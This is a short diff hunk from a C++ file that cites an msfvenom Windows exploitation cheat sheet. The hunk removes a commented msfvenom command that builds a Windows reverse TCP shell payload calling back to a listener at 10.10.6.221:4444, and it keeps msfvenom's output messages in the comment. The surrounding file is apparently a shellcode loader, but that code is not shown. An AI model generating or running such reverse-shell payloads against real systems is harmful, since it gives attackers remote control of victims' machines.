@@ -13,7 +13,7 @@ using namespace std;
 //https://www.hackingarticles.in/msfvenom-cheatsheet-windows-exploitation/
 bool main() {
 	/*
-	msfvenom - p windows / shell_reverse_tcp LHOST = 10.10.6.221 LPORT = 4444 - f c
+	 
 		[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 		[-] No arch selected, selecting arch : x86 from the payload
 		No encoder specified, outputting raw payload
